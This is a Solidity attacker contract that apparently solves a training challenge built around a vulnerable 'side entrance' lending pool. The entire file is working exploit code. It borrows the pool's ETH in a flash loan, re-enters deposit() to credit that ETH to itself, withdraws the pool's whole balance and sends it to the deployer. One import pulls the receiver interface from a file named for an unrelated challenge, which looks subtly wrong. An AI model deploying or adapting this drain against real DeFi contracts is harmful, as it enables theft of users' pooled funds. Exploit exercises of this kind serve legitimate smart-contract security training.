// SPDX-License-Identifier: MIT
// SIDE-ENTRANCE DRAIN (reentrancy class).
// Technique: flashLoan() hands the pool's ETH to our callback; we re-enter
// deposit() to book the same ETH as OUR credit, so the pool's balance check
// passes while we later withdraw() everything it owns.
pragma solidity ^0.8.0;

import {ISideEntranceLenderPool} from "../interfaces/ISideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "../interfaces/IFreeRiderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool public immutable pool;
    address public immutable owner;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() external payable override {
        // Re-enter the pool: book the flash-loaned ETH as our own deposit.
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
